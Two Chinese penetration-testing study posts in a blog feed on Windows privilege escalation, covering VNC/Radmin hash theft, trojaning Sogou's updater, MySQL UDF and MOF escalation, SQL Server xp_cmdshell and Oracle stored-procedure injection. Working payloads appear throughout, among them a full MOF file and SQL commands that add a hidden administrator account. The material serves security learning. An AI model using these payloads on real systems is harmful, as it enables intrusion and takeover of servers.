title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\R</span>ealVNC<span class="symbol">\W</span>inVNC4<span class="symbol">\P</span>assword</span><br></pre></td></tr></table></figure><p>（2）UltraVNC的注册表路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\O</span>RL<span class="symbol">\W</span>inVNC3<span class="symbol">\D</span>efault<span class="symbol">\p</span>assword</span><br></pre></td></tr></table></figure><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p><p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p><p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p><p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p><h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul><li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li><li>默认开放 <code>4899</code>端口</li><li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li></ul><h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p><h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersParameter<span class="comment">//默认密码注册表位置</span></span><br><span class="line">HKEY_LOCAL_MACHINESYSTEMRAdminv2<span class="number">.0</span>ServerParametersPort <span class="comment">//默认端口注册表位置</span></span><br></pre></td></tr></table></figure><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p><p><strong>3、查看远程屏幕</strong></p><p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p><p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p><p><strong>5、登录远程桌面</strong></p><p>在本地打开远程桌面连接器，输入远端IP进行登录。</p><h4 id="第三方软件搜狗输入法提权"><a href="#第三方软件搜狗输入法提权" class="headerlink" title="第三方软件搜狗输入法提权"></a>第三方软件搜狗输入法提权</h4><h5 id="提权简介"><a href="#提权简介" class="headerlink" title="提权简介"></a>提权简介</h5><p>​            搜狗低版本输入法根目录下有一个：<strong>PinyinUp.exe</strong>是用来更新词典用的，管理员为了保存词库，有可能会把搜狗输入法安装到D盘，搜狗输入法目录默认是Everyone可读可写，搜狗每隔一段时间就会自动升级，而升级的文件是<strong>PinyinUp.exe</strong>，</p><p>​            由于搜狗输入法默认设置是自动更新，更新程序没有对exe做任何校验直接在输入法升级时调用运行，导致可以执行恶意代码。</p><h5 id="提权步骤-2"><a href="#提权步骤-2" class="headerlink" title="提权步骤"></a>提权步骤</h5><p>​         我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。搜狗拼音输入法，会定时调用这个文件进行升级，用户无法禁止。</p><p>（很老的一个漏洞了，现在应该这种情况应该也很少见了。。。。。）</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1547098</a></p><p><a href="https://yqxy20.blog.csdn.net/article/details/99707033" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99707033</a></p><p><a href="https://yqxy20.blog.csdn.net/article/details/99715736" target="_blank" rel="noopener">https://yqxy20.blog.csdn.net/article/details/99715736</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;提权之第三方软件提权总结&quot;&gt;&lt;a href=&quot;#提权之第三方软件提权总结&quot; class=&quot;headerlink&quot; title=&quot;提权之第三方软件提权总结&quot;&gt;&lt;/a&gt;提权之第三方软件提权总结&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>windows渗透测试中常见提权方式总结(二)</title>
    <link href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/"/>
    <id>https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/</id>
    <published>2020-04-28T01:56:41.000Z</published>
    <updated>2020-05-17T11:36:05.721Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试中常见提权方式总结（二）"><a href="#渗透测试中常见提权方式总结（二）" class="headerlink" title="渗透测试中常见提权方式总结（二）"></a>渗透测试中常见提权方式总结（二）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql提权概述"><a href="#mysql提权概述" class="headerlink" title="mysql提权概述"></a>mysql提权概述</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><ul><li><strong>功能型：</strong>udf提权</li><li><strong>技巧型：</strong>启动项提权</li><li><strong>漏洞型：</strong>mof提权</li></ul><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p><p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p><p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p><h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p><ul><li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p></li><li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p></li><li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p></li><li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p></li><li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p><p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p></li></ul><h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p><ul><li>MySQL 数据库没有开启安全模式。</li><li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li><li>shell 有写入到数据库安装目录的权限。</li></ul><p><strong>高版本mysql(mysql Version&gt;5.7)遇到的一些问题：</strong></p><ul><li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p><ul><li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">""</span></span><br></pre></td></tr></table></figure><pre><code>将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li><li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p></li><li><p>mysql.user下password列更改为authentication_string列。</p></li></ul><h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p><p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p><p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p><p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p><p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p><p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p><p>还可以执行数据库命令：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p><p>这里补充一个点:</p><ul><li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li><li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li></ul><p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p><p>用NTFS ADS流模式突破进而创建文件夹</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@basedir;  <span class="regexp">//</span>查找到mysql的目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建<span class="class"><span class="keyword">lib</span>目录</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'It is dll'</span> into dumpfile <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'</span>;    <span class="regexp">//</span>利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><p>我直接在菜刀下创建plugin文件夹</p><p>然后最关键的一步：<strong>导出UDF文件</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p><p>导出后，再次尝试文件已经存在，说明导入成功。</p><p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p><p>引入sys_eval函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'moonudf.dll'</span></span><br></pre></td></tr></table></figure><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p><p>之后使用命令模板即可执行命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="symbol">'ipconfig</span>)</span><br></pre></td></tr></table></figure><p>也可以直接使用大马这里的功能选项：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p><h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p><p>进入模块，看一下需要配置选项：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p><p>注：这里注意版本，适用于5.5.9以下，</p><h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -d mysql://root:xxxxxx<span class="variable">@VPS</span>:3306/mysql --os-shell</span><br></pre></td></tr></table></figure><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p><h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p><p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p><p>文件内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test test /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p><p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"C:/phpStudy/WWW/nullevt.mof"</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">"c:/windows/system32/wbem/mof/nullevt.mof"</span></span><br></pre></td></tr></table></figure><p>可以使用菜刀下的数据库管理工具执行</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p><p>执行后，到win2003上查看用户：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p><p>之后我们可以将自定义的命令改为：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.exe localgroup administrators test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure><p>即可对添加的用户进行提权。</p><h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p><h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p><p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p><h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p><ul><li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li><li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li><li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li></ul><h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p><p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p><ul><li>getshell或者存在sql注入并且能够执行命令</li><li>sql server是system权限，sql server默认就是system权限。</li><li>获取SA用户口令</li></ul><h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul><li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">conn.aspx</span><br><span class="line">config.aspx</span><br><span class="line">config.php</span><br><span class="line">web.config</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">一般格式如：</span><br><span class="line"></span><br><span class="line"><span class="attribute">server</span>=localhost;</span><br><span class="line"><span class="attribute">UID</span>=sa;</span><br><span class="line"><span class="attribute">PWD</span>=shadowflow</span><br></pre></td></tr></table></figure><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p><p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p><h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>,1;reconfigure;</span><br></pre></td></tr></table></figure><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>, 0;reconfigure</span><br></pre></td></tr></table></figure><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net user test pinohd123. /add'</span>    添加用户<span class="built_in">test</span>，密码<span class="built_in">test</span></span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net localgroup administrators test add'</span>    添加<span class="built_in">test</span>用户到管理员组</span><br></pre></td></tr></table></figure><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li><li>用户拥有<code>create procedure</code>权限（用来创建函数）</li></ul><h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul><li>用户登陆后执行<code>select * from session_privs</code>查看权限</li><li>创建函数，命令为<code>grant dba to quan</code></li></ul><p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">create</span> <span class="keyword">or replace</span> <span class="keyword">function</span> pwn <span class="keyword">return</span> vaarchar2</span><br><span class="line">authid <span class="built_in">current_user</span> <span class="keyword">is</span> pragma autonomous_transaction;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">immediate</span> <span class="string">'grant dba to quan'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">grant</span> <span class="keyword">execute</span> <span class="keyword">on</span> pwn <span class="keyword">to</span> <span class="built_in">public</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>注入sys.dbms_cdc_subscribe.activate_subscription</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;begin</span><br><span class="line">sys.dbms_cdc_subscribe.activate_subscription(<span class="string">'''||quan.pwn()||'''</span>);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">SQL&gt;set role dba;</span><br></pre></td></tr></table></figure><p>执行<code>select * from session_privs</code>查看是否为dba权限</p><h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/sqli/<span class="keyword">oracle</span>/dbms_cdc_subscribe.activate_subscription</span><br></pre></td></tr></table></figure><p>2.配置参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> dbuser quan</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> dbpass quan123</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sid orcl</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> rhost xxxxx</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sql grant dba <span class="keyword">to</span> quan</span><br></pre></td></tr></table></figure><p>3.run</p><h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>UTL_HTTP存储过程可用</li><li>Oracle9i~11gR2</li></ul><h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol><li>创建Java包</li><li>创建存储过程MYJAVACMD</li><li>执行存储过程，成功添加用户</li></ol><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/0nc3/p/12081189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nc3/p/12081189.html</a></p><p><a href="https://www.webshell.cc/4790.html" target="_blank" rel="noopener">https://www.webshell.cc/4790.html</a></p><p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719</a></p><p><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;渗透测试中常见提权方式总结（二）&quot;&gt;&lt;a href=&quot;#渗透测试中常见提权方式总结（二）&quot; class=&quot;headerlink&quot; title=&quot;渗透测试中常见提权方式总结（二）&quot;&gt;&lt;/a&gt;渗透测试中常见提权方式总结（二）&lt;/h2&gt;&lt;h3 id=&quot;数据库提权&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
